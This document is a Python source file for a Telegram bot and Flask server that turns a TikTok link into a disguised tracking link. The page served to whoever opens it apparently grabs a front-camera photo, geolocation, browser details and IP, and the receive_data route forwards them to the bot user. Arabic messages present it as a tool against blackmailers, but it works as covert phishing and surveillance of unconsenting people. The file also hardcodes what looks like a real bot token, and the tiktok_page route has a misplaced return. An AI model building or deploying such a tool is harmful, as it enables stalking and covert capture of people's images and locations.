import threading
from flask import Flask, request, render_template_string
import telebot
import re

TOKEN = "7214746668:AAGYdeZRour9X4V2hB8Pl9LhDQPIOFV913I"
bot = telebot.TeleBot(TOKEN)

CHANNEL_USERNAME = "@Mr_AM4_M"

app = Flask(__name__, template_folder="templates")
user_links = {}  # chat_id: link

def is_valid_url(text):
    return re.match(r'https?://\S+', text)


def is_user_subscribed(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        return False


@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    if not is_user_subscribed(chat_id):
        bot.send_message(chat_id, """
⚠️ عذراً عزيزي..\n\n
🔰عليك الاشتراك في قناة البوت لتتمكن من استخدامه\n\n
📢 قناتنا: @Mr_AM4_M\n\n
‼️ اشترك ثم أرسل /start\n\n
""")
        return

    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    bot.send_message(chat_id, """🛡️ <b>مرحبًا بك في بوت منظمة MA4</b>

🔗 أرسل رابط فيديو تيك توك
وسيتم توليد رابط ذكي لتحليل هوية المرسل

📸 نلتقط صورة من الكامره لاماميه لجهاز المبتز
📍 نحدد موقعه الجغرافي
🌐 نكشف نوع جهازه ومتصفحه

⚖️ هذا البوت مخصص لحماية ضحايا الابتزاز الإلكتروني فقط.
⛔ يُمنع استخدامه لأي غرض غير قانوني.
""", parse_mode="HTML")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    if is_valid_url(text):
        user_links[chat_id] = text
        html_link = f"http://127.0.0.1:5000/tiktok/{chat_id}"
        bot.send_message(chat_id, f"""🎯 <b>تم إنشاء الرابط الذكي!</b>

🕵️ أرسل هذا الرابط إلى الشخص المبتز:
🔗 <a href="{html_link}">{html_link}</a>

📸 سيتم التقاط صورة من جهازه
📍 وتحديد موقعه الجغرافي
🌐 وكشف نوع الجهاز والمتصفح تلقائيًا

⚠️ هذا الرابط مخصص فقط لأغراض الحماية من الابتزاز.
""", parse_mode="HTML")
    else:
        bot.send_message(chat_id, "الرجاء إرسال رابط TikTok صحيح.")

@app.route("/tiktok/<int:chat_id>")
def tiktok_page(chat_id):
    if chat_id in user_links:
        from flask import render_template
    return render_template("TikTok.html", my_link=user_links[chat_id], chat_id=chat_id)
    return "رابط غير صالح", 404

@app.route("/receive_data/<int:chat_id>", methods=["POST"], strict_slashes=False)
def receive_data(chat_id):
    image = request.files.get("image")
    location = request.form.get("location")
    browser = request.form.get("browser")
    ip = request.remote_addr

    msg = (
    f"\n📍 تم التقاط صورة وموقع:\n\n"
    f"🌍 الموقع:\n{location}\n\n"
    f"🖥️ المتصفح:\n{browser}\n\n"
    f"🌐 IP:\n{ip}\n\n"
    f"⚠️ تم إرسال هذه البيانات بسرية. يُمنع استخدامها لغير الأغراض القانونية."
)
    bot.send_message(chat_id, msg)
    if image:
        bot.send_photo(chat_id, image)

    return "تم الاستلام", 200

def run_bot():
    bot.polling(non_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=5000)